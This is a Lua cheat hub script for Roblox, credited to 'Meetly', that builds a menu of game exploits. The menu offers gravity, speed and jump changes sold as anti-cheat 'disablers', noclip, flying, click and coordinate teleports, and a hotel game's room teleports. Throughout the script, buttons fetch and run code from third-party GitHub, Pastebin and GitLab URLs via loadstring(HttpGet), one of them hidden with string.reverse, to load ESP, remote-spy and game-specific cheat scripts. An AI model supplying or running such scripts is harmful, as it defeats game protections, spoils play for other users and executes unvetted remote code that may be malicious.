print("Script Load! (by Meetly)")

game.StarterGui:SetCore(
"SendNotification",
{
Title = "Made by Meetly",
Text = "Thank you for choosing us!"
}
)

game.StarterGui:SetCore(
"SendNotification",
{
Title = "Discord",
Text = "TheMeetly#0885"
}
)

game.StarterGui:SetCore(
"SendNotification",
{
Title = "Coding helper",
Text = "Robojini#1524"
}
)

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()
 
local Window = Library.CreateLib("MEETLY HUB PREMIUM [New Year]", "RJTheme7")
 
local Tab = Window:NewTab("Main")
 
local Section = Tab:NewSection("Hack to Player")

Section:NewButton("Default Gravity", "-", function()
wait()
game.workspace.Gravity = 192.2
end)

Section:NewButton("Average Gravity", "-", function()
wait()
game.workspace.Gravity = 70
end)
 
Section:NewButton("low Gravity", "-", function()
wait()
game.workspace.Gravity = 20
end)
 
Section:NewButton("Super low Gravity", "-", function()
wait()
game.workspace.Gravity = 5
end)

Section:NewSlider("Gravity slider","-", 192, 1, function(s)
wait()
game.workspace.Gravity = s
end)

Section:NewToggle("Disabler AntiWalkSpeed", "wait 0.4 second", function(state)
    if state then
game:GetService("RunService").RenderStepped:wait() do
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 150
end
    else
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 17.3
    end
end)

Section:NewSlider("CFrame Speed [Z]",0,1000,0, function(t)
    local plr = game.Players.LocalPlayer
    down = false

    function onButton1Down(mouse)
        down = true
        while down do
            if not down then break end
            local char = plr.Character

            char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * t
            wait()
        end
    end

    function onButton1Up(mouse)
        down = false
    end

    function onSelected(mouse)
        mouse.KeyDown:connect(function(k) if k:lower()=="z"then onButton1Down(mouse)end end)
        mouse.KeyUp:connect(function(k) if k:lower()=="z"then onButton1Up(mouse)end end)
    end
    onSelected(game.Players.LocalPlayer:GetMouse())
end)

Section:NewToggle("Disabler AntiJumpPower", "wait 1 second", function(state)
    if state then
game:GetService("RunService").RenderStepped:wait() do
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 150
end
    else
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
    end
end)

Section:NewToggle("Vclip up [double tap]", "2 tap", function(state)
    if state then
       game.Players.LocalPlayer.Character.Humanoid.HipHeight = 40
    else
       game.Players.LocalPlayer.Character.Humanoid.HipHeight = 2
end
end)

Section:NewToggle("Vclip up 2 [double tap]", "2 tap", function(state)
    if state then
       game.Players.LocalPlayer.Character.Humanoid.HipHeight = 40
    else
       game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
end
end)

Section:NewButton("KT LEAVE", "click tp", function()
wait()
bin=Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
bin.Name = "KT LEAVE"
 
function teleportPlayer(pos)
 
local player = game.Players.LocalPlayer
if player == nil or player.Character == nil then return end
 
local char = player.Character
 
char:MoveTo(pos)
 
end
 
 
enabled = true
function onButton1Down(mouse)
if not enabled then
return
end
 
local player = game.Players.LocalPlayer
if player == nil then return end
local cf = mouse.Hit
teleportPlayer(cf.p)
 
end
 
function onSelected(mouse)
mouse.Icon = "rbxassetUndecided/textures\\ArrowCursor.png"
mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end
 
bin.Selected:connect(onSelected)
end)
 
Section:NewButton("KT LEAVE 2","Teleport KT", function()
wait()
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()
local window1 = library:Window("KT LEAVE Create meetly")
 
window1:Button("KT LEAVE",function()
local _speed=1000
function tp(...)
   local plr=game.Players.LocalPlayer
   local args={...}
   if typeof(args[1])=="number"and args[2]and args[3]then
      args=Vector3.new(args[1],args[2],args[3])
   elseif typeof(args[1])=="Vector3" then
       args=args[1]    
   elseif typeof(args[1])=="CFrame" then
       args=args[1].Position
   end
   local dist=(plr.Character.HumanoidRootPart.Position-args).Magnitude
   game:GetService("TweenService"):Create(
       plr.Character.HumanoidRootPart,
       TweenInfo.new(dist/_speed,Enum.EasingStyle.Linear),
       {CFrame=CFrame.new(args)}
   ):Play()
end
 
 
tp(-945, 119, -2979)
end)
end)
 
Section:NewSlider("Speed", "Speed", 1000, 20, function(s) -- 1000 (Макс. значение) | 20 (Мин. значение)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)
 
Section:NewSlider("JumpPower", "JumpPower", 1000, 50, function(s) -- 1000 (Макс. значение) | 50 (Мин. значение)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)
 
Section:NewButton("Noclip gui", "passage through walls", function()
wait()
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local StatusPF = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Credit = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false
 
Noclip.Name = "Noclip"
Noclip.Parent = game.CoreGui
 
BG.Name = "BG"
BG.Parent = Noclip
BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
BG.BorderSizePixel = 2
BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
BG.Size = UDim2.new(0, 210, 0, 127)
BG.Active = true
BG.Draggable = true
 
Title.Name = "Title"
Title.Parent = BG
Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Title.BorderSizePixel = 2
Title.Size = UDim2.new(0, 210, 0, 33)
Title.Font = Enum.Font.Highway
Title.Text = "Noclip"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.FontSize = Enum.FontSize.Size32
Title.TextSize = 30
Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Title.TextStrokeTransparency = 0
 
Toggle.Parent = BG
Toggle.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Toggle.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.BorderSizePixel = 2
Toggle.Position = UDim2.new(0.152380958, 0, 0.374192119, 0)
Toggle.Size = UDim2.new(0, 146, 0, 36)
Toggle.Font = Enum.Font.Highway
Toggle.FontSize = Enum.FontSize.Size28
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.new(1, 1, 1)
Toggle.TextSize = 25
Toggle.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.TextStrokeTransparency = 0
 
StatusPF.Name = "StatusPF"
StatusPF.Parent = BG
StatusPF.BackgroundColor3 = Color3.new(1, 1, 1)
StatusPF.BackgroundTransparency = 1
StatusPF.Position = UDim2.new(0.314285725, 0, 0.708661377, 0)
StatusPF.Size = UDim2.new(0, 56, 0, 20)
StatusPF.Font = Enum.Font.Highway
StatusPF.FontSize = Enum.FontSize.Size24
StatusPF.Text = "Status:"
StatusPF.TextColor3 = Color3.new(1, 1, 1)
StatusPF.TextSize = 20
StatusPF.TextStrokeColor3 = Color3.new(0.333333, 0.333333, 0.333333)
StatusPF.TextStrokeTransparency = 0
StatusPF.TextWrapped = true
 
Status.Name = "Status"
Status.Parent = BG
Status.BackgroundColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0.580952346, 0, 0.708661377, 0)
Status.Size = UDim2.new(0, 56, 0, 20)
Status.Font = Enum.Font.Highway
Status.FontSize = Enum.FontSize.Size14
Status.Text = "off"
Status.TextColor3 = Color3.new(0.666667, 0, 0)
Status.TextScaled = true
Status.TextSize = 14
Status.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Status.TextWrapped = true
Status.TextXAlignment = Enum.TextXAlignment.Left
 
Credit.Name = "Credit"
Credit.Parent = BG
Credit.BackgroundColor3 = Color3.new(1, 1, 1)
Credit.BackgroundTransparency = 1
Credit.Position = UDim2.new(0.195238099, 0, 0.866141737, 0)
Credit.Size = UDim2.new(0, 128, 0, 17)
Credit.Font = Enum.Font.SourceSans
Credit.FontSize = Enum.FontSize.Size18
Credit.Text = "Created by Meetly"
Credit.TextColor3 = Color3.new(1, 1, 1)
Credit.TextSize = 16
Credit.TextStrokeColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Credit.TextStrokeTransparency = 0
Credit.TextWrapped = true
 
Toggle.MouseButton1Click:connect(function()
    if Status.Text == "off" then
        Clipon = true
        Status.Text = "on"
        Status.TextColor3 = Color3.new(0,185,0)
        Stepped = game:GetService("RunService").Stepped:Connect(function()
            if not Clipon == false then
                for a, b in pairs(Workspace:GetChildren()) do
                if b.Name == Plr.Name then
                for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
            else
                Stepped:Disconnect()
            end
        end)
    elseif Status.Text == "on" then
        Clipon = false
        Status.Text = "off"
        Status.TextColor3 = Color3.new(170,0,0)
    end
end)
end)
 
Section:NewButton("Fly", "You can fly (PRESS TO E)", function()
wait()
repeat wait() 
    until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
local mouse = game.Players.LocalPlayer:GetMouse() 
repeat wait() until mouse
local plr = game.Players.LocalPlayer 
local torso = plr.Character.Torso 
local flying = true
local deb = true 
local ctrl = {f = 0, b = 0, l = 0, r = 0} 
local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
local maxspeed = 50 
local speed = 0 
 
function Fly() 
local bg = Instance.new("BodyGyro", torso) 
bg.P = 9e4 
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
bg.cframe = torso.CFrame 
local bv = Instance.new("BodyVelocity", torso) 
bv.velocity = Vector3.new(0,0.1,0) 
bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
repeat wait() 
plr.Character.Humanoid.PlatformStand = true 
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
speed = speed+.5+(speed/maxspeed) 
if speed > maxspeed then 
speed = maxspeed 
end 
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
speed = speed-1 
if speed < 0 then 
speed = 0 
end 
end 
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
else 
bv.velocity = Vector3.new(0,0.1,0) 
end 
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
until not flying 
ctrl = {f = 0, b = 0, l = 0, r = 0} 
lastctrl = {f = 0, b = 0, l = 0, r = 0} 
speed = 0 
bg:Destroy() 
bv:Destroy() 
plr.Character.Humanoid.PlatformStand = false 
end 
mouse.KeyDown:connect(function(key) 
if key:lower() == "e" then 
if flying then flying = false 
else 
flying = true 
Fly() 
end 
elseif key:lower() == "w" then 
ctrl.f = 1 
elseif key:lower() == "s" then 
ctrl.b = -1 
elseif key:lower() == "a" then 
ctrl.l = -1 
elseif key:lower() == "d" then 
ctrl.r = 1 
end 
end) 
mouse.KeyUp:connect(function(key) 
if key:lower() == "w" then 
ctrl.f = 0 
elseif key:lower() == "s" then 
ctrl.b = 0 
elseif key:lower() == "a" then 
ctrl.l = 0 
elseif key:lower() == "d" then 
ctrl.r = 0 
end 
end)
Fly()
end)
 
Section:NewButton("CRTL click tp", "hold CTRL and CLICK", function()
local UIS = game:GetService("UserInputService")
 
local Player = game.Players.LocalPlayer
local Mouse = Player:GetMouse()
 
 
function GetCharacter()
   return game.Players.LocalPlayer.Character
end
 
function Teleport(pos)
   local Char = GetCharacter()
   if Char then
       Char:MoveTo(pos)
   end
end
 
 
UIS.InputBegan:Connect(function(input)
   if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
       Teleport(Mouse.Hit.p)
   end
end)
end)

local Section = Tab:NewSection("Tool (FMSTR)")

Section:NewButton("Dex", "-", function()
wait()
loadstring(game:GetObjects('rbxassetid://2180084478')[1].Source)()
end)

Section:NewButton("Remote Spy", "-", function()
wait()
loadstring(game:HttpGet("https://pastebin.com/raw/bCghX33W", true))()
end)
 
local Tab = Window:NewTab("Scripts")
 
local Section = Tab:NewSection("Script HUB")
 
Section:NewButton("Infiniteyield", "-", function()
wait()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))() --nice!--
end)
 
Section:NewButton("Epic mini games", "-", function()
wait()
loadstring(game:HttpGet("https://pastebin.com/raw/YePwz5u5", true))()
end)
 
Section:NewButton("Arsenal", "-", function()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/katrina367/ScriptBlox-Projects/main/OblivionAutoEXEV1'))()
end)
 
Section:NewButton("Hide And Seek Extreme", "Grab All Coins, Player Esp", function()
wait()
loadstring(game:HttpGet('https://gist.githubusercontent.com/RavyarTheBest/d0d5f9c3a8c2ca6749dda6d50fddaf00/raw/d05311914c0ab73506de76e91297743ad53097e2/gistfile1.txt'))()
end)

Section:NewButton("Area 51", "-", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/SurviveandKilltheKillersinArea51.lua"))()
end)

Section:NewButton("Ragdoll Engine", "-", function()
wait()
loadstring(game:HttpGet(('https://gitlab.com/Tsuniox/lua-stuff/-/raw/master/RagdollEngineGUI.lua'),true))()
end)

Section:NewButton("Tower Of Hell [more] ----------->","Teleport To The Finish, God Mode & More", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Loader.lua"))()
end)

Section:NewButton("pet simulator x", "-", function()
wait()
local link, response = pcall(game.HttpGet, game, string.reverse'aul.niaM/ihcati/113vbuhretsam/lolytsed/moc.tnetnocresubuhtig.war//:sptth', true)
if not link then return error("Failed to access raw") end
local loads, err = coroutine.create(loadstring(response, '@desty#1821', '@GramxPersons#1111'))
if not loads then return error('Failed to load response') end
coroutine.resume(loads)
end)

Section:NewButton("MM2", "-", function()
wait()
repeat wait() until game.Players.LocalPlayer.Character
url = "https://raw.githubusercontent.com/xennyy/Xenny-Ware/main/loader.lua"
loadstring(game:HttpGet(url))()
end)

Section:NewButton("slap battles", "-", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/sbbe", true))()
end)

Section:NewButton("Hotel (Teleport)", "-", function()
wait()
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()
 
local Window = Library.CreateLib("Hotel Script [New Year]", "RJTheme1")
 
local Tab = Window:NewTab("Teleport")
 
local Section = Tab:NewSection("Teleport to location")

Section:NewButton("Teleport to lobby", "-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-17.0841465, 3.12035966, -5.50693083, -0.999969721, 1.79440693e-08, 0.00778075261, 1.77179622e-08, 1, -2.91285751e-08, -0.00778075261, -2.89898345e-08, -0.999969721)
end)

Section:NewButton("Teleport to Lobby doors","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-19.1821957, 3.09999919, -31.4253216, -0.999962687, -5.73006353e-08, -0.00863679312, -5.72885952e-08, 1, -1.6414804e-09, 0.00863679312, -1.14662946e-09, -0.999962687)
end)

Section:NewButton("Teleport to Roof","-",function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-35.0348892, 118.701996, 28.1529846, 0.0646820217, -6.33888746e-08, 0.99790591, 4.03932034e-08, 1, 6.09037016e-08, -0.99790591, 3.63692401e-08, 0.0646820217)
end)

Section:NewButton("Teleport to Secret End", "-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(33.8493843, 129.404953, 5.43408394, -0.051406309, -7.40296073e-08, -0.99867785, 5.32146558e-08, 1, -7.68668116e-08, 0.99867785, -5.70957361e-08, -0.051406309)
end)

Section:NewButton("Teleport to the elevator on the 1st floor", "-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(19.0589886, 3.30001235, 5.64972115, -0.0164933354, -6.86159467e-08, 0.999863982, 1.10235607e-08, 1, 6.88071182e-08, -0.999863982, 1.21569208e-08, -0.0164933354)
end)

Section:NewButton("Fly", "You can fly (PRESS TO E)", function()
wait()
repeat wait() 
    until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
local mouse = game.Players.LocalPlayer:GetMouse() 
repeat wait() until mouse
local plr = game.Players.LocalPlayer 
local torso = plr.Character.Torso 
local flying = true
local deb = true 
local ctrl = {f = 0, b = 0, l = 0, r = 0} 
local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
local maxspeed = 50 
local speed = 0 
 
function Fly() 
local bg = Instance.new("BodyGyro", torso) 
bg.P = 9e4 
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
bg.cframe = torso.CFrame 
local bv = Instance.new("BodyVelocity", torso) 
bv.velocity = Vector3.new(0,0.1,0) 
bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
repeat wait() 
plr.Character.Humanoid.PlatformStand = true 
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
speed = speed+.5+(speed/maxspeed) 
if speed > maxspeed then 
speed = maxspeed 
end 
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
speed = speed-1 
if speed < 0 then 
speed = 0 
end 
end 
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
else 
bv.velocity = Vector3.new(0,0.1,0) 
end 
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
until not flying 
ctrl = {f = 0, b = 0, l = 0, r = 0} 
lastctrl = {f = 0, b = 0, l = 0, r = 0} 
speed = 0 
bg:Destroy() 
bv:Destroy() 
plr.Character.Humanoid.PlatformStand = false 
end 
mouse.KeyDown:connect(function(key) 
if key:lower() == "e" then 
if flying then flying = false 
else 
flying = true 
Fly() 
end 
elseif key:lower() == "w" then 
ctrl.f = 1 
elseif key:lower() == "s" then 
ctrl.b = -1 
elseif key:lower() == "a" then 
ctrl.l = -1 
elseif key:lower() == "d" then 
ctrl.r = 1 
end 
end) 
mouse.KeyUp:connect(function(key) 
if key:lower() == "w" then 
ctrl.f = 0 
elseif key:lower() == "s" then 
ctrl.b = 0 
elseif key:lower() == "a" then 
ctrl.l = 0 
elseif key:lower() == "d" then 
ctrl.r = 0 
end 
end)
Fly()
end)

Section:NewButton("Noclip", "-", function()
wait()
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local StatusPF = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Credit = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false
 
Noclip.Name = "Noclip"
Noclip.Parent = game.CoreGui
 
BG.Name = "BG"
BG.Parent = Noclip
BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
BG.BorderSizePixel = 2
BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
BG.Size = UDim2.new(0, 210, 0, 127)
BG.Active = true
BG.Draggable = true
 
Title.Name = "Title"
Title.Parent = BG
Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Title.BorderSizePixel = 2
Title.Size = UDim2.new(0, 210, 0, 33)
Title.Font = Enum.Font.Highway
Title.Text = "Noclip"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.FontSize = Enum.FontSize.Size32
Title.TextSize = 30
Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Title.TextStrokeTransparency = 0
 
Toggle.Parent = BG
Toggle.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Toggle.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.BorderSizePixel = 2
Toggle.Position = UDim2.new(0.152380958, 0, 0.374192119, 0)
Toggle.Size = UDim2.new(0, 146, 0, 36)
Toggle.Font = Enum.Font.Highway
Toggle.FontSize = Enum.FontSize.Size28
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.new(1, 1, 1)
Toggle.TextSize = 25
Toggle.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.TextStrokeTransparency = 0
 
StatusPF.Name = "StatusPF"
StatusPF.Parent = BG
StatusPF.BackgroundColor3 = Color3.new(1, 1, 1)
StatusPF.BackgroundTransparency = 1
StatusPF.Position = UDim2.new(0.314285725, 0, 0.708661377, 0)
StatusPF.Size = UDim2.new(0, 56, 0, 20)
StatusPF.Font = Enum.Font.Highway
StatusPF.FontSize = Enum.FontSize.Size24
StatusPF.Text = "Status:"
StatusPF.TextColor3 = Color3.new(1, 1, 1)
StatusPF.TextSize = 20
StatusPF.TextStrokeColor3 = Color3.new(0.333333, 0.333333, 0.333333)
StatusPF.TextStrokeTransparency = 0
StatusPF.TextWrapped = true
 
Status.Name = "Status"
Status.Parent = BG
Status.BackgroundColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0.580952346, 0, 0.708661377, 0)
Status.Size = UDim2.new(0, 56, 0, 20)
Status.Font = Enum.Font.Highway
Status.FontSize = Enum.FontSize.Size14
Status.Text = "off"
Status.TextColor3 = Color3.new(0.666667, 0, 0)
Status.TextScaled = true
Status.TextSize = 14
Status.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Status.TextWrapped = true
Status.TextXAlignment = Enum.TextXAlignment.Left
 
Credit.Name = "Credit"
Credit.Parent = BG
Credit.BackgroundColor3 = Color3.new(1, 1, 1)
Credit.BackgroundTransparency = 1
Credit.Position = UDim2.new(0.195238099, 0, 0.866141737, 0)
Credit.Size = UDim2.new(0, 128, 0, 17)
Credit.Font = Enum.Font.SourceSans
Credit.FontSize = Enum.FontSize.Size18
Credit.Text = "Created by Meetly"
Credit.TextColor3 = Color3.new(1, 1, 1)
Credit.TextSize = 16
Credit.TextStrokeColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Credit.TextStrokeTransparency = 0
Credit.TextWrapped = true
 
Toggle.MouseButton1Click:connect(function()
    if Status.Text == "off" then
        Clipon = true
        Status.Text = "on"
        Status.TextColor3 = Color3.new(0,185,0)
        Stepped = game:GetService("RunService").Stepped:Connect(function()
            if not Clipon == false then
                for a, b in pairs(Workspace:GetChildren()) do
                if b.Name == Plr.Name then
                for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
            else
                Stepped:Disconnect()
            end
        end)
    elseif Status.Text == "on" then
        Clipon = false
        Status.Text = "off"
        Status.TextColor3 = Color3.new(170,0,0)
    end
end)
end)

Section:NewButton("Universal ESP", "ESP", function()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
end)

local Tab = Window:NewTab("Room")

local Section = Tab:NewSection("Teleport to Room")

Section:NewButton("Teleport to 201 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(12.658576, 28.3099861, 39.1859894, 0.99999404, -3.31578001e-08, -0.00344511145, 3.327375e-08, 1, 3.359904e-08, 0.00344511145, -3.37134729e-08, 0.99999404)
end)

Section:NewButton("Teleport to 202 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1.83784711, 28.3099861, 89.3056183, -0.00577315688, 2.52650967e-08, -0.999983311, -1.05413449e-07, 1, 2.58740958e-08, 0.999983311, 1.05561064e-07, -0.00577315688)
end)

Section:NewButton("Teleport to 203 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(28.5301018, 28.3099861, 88.3382263, 0.00510061625, -5.24217043e-08, -0.999987006, 4.57833096e-08, 1, -5.21888595e-08, 0.999987006, -4.55165186e-08, 0.00510061625)
end)

Section:NewButton("Teleport to 301 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9.47460175, 53.3079834, 44.2039146, -0.0579495691, 1.1918106e-07, -0.998319507, 2.60743138e-09, 1, 1.19230322e-07, 0.998319507, 4.30629621e-09, -0.0579495691)
end)

Section:NewButton("Teleport to 302 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1.43064654, 53.3099823, 67.2761688, -0.991115928, -4.65706975e-08, 0.133000672, -3.80460357e-08, 1, 6.66362467e-08, -0.133000672, 6.09840995e-08, -0.991115928)
end)

Section:NewButton("Teleport to 303 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(24.182148, 53.3079834, 66.7197723, -0.99993819, -4.58717536e-10, -0.011117843, -1.51710322e-09, 1, 9.51885966e-08, 0.011117843, 9.51995816e-08, -0.99993819 )
end)

Section:NewButton("Teleport to 401 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(12.7367868, 78.309967, 39.2877312, 0.999722064, -5.61522242e-08, -0.0235757791, 5.56044952e-08, 1, -2.38882158e-08, 0.0235757791, 2.25706565e-08, 0.999722064)
end)

Section:NewButton("Teleport to 402 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2.83879352, 78.309967, 89.4008713, 0.0127693806, 3.16451754e-08, -0.999918461, 7.16524085e-08, 1, 3.2562788e-08, 0.999918461, -7.20623703e-08, 0.0127693806)
end)

Section:NewButton("Teleport to 403 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(28.5971813, 78.309967, 89.1277161, -0.0294504017, 2.99247951e-08, -0.999566257, 3.24352598e-08, 1, 2.8982134e-08, 0.999566257, -3.15676552e-08, -0.0294504017)
end)

local Setting = Window:NewTab("Setting")
local SettingSection = Setting:NewSection("Setting")

SettingSection:NewKeybind("Toggle UI", "Close/Open UI", Enum.KeyCode.BackSlash, function()
    Library:ToggleUI()
end)

Section:NewButton("FPS BOOSTER", "Boost FPS", function()
-- Made by RIP#6666
_G.Settings = {
    Players = {
        ["Ignore Me"] = true, -- Ignore your Character
        ["Ignore Others"] = true -- Ignore other Characters
    },
    Meshes = {
        Destroy = false, -- Destroy Meshes
        LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
    },
    Images = {
        Invisible = true, -- Invisible Images
        LowDetail = false, -- Low detail images (NOT SURE IT DOES ANYTHING)
        Destroy = false, -- Destroy Images
    },
    Other = {
        ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
        ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
        ["No Explosions"] = true, -- Makes Explosion's invisible
        ["No Clothes"] = true, -- Removes Clothing from the game
        ["Low Water Graphics"] = true, -- Removes Water Quality
        ["No Shadows"] = true, -- Remove Shadows
        ["Low Rendering"] = true, -- Lower Rendering
        ["Low Quality Parts"] = true -- Lower quality parts
    }
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
end)

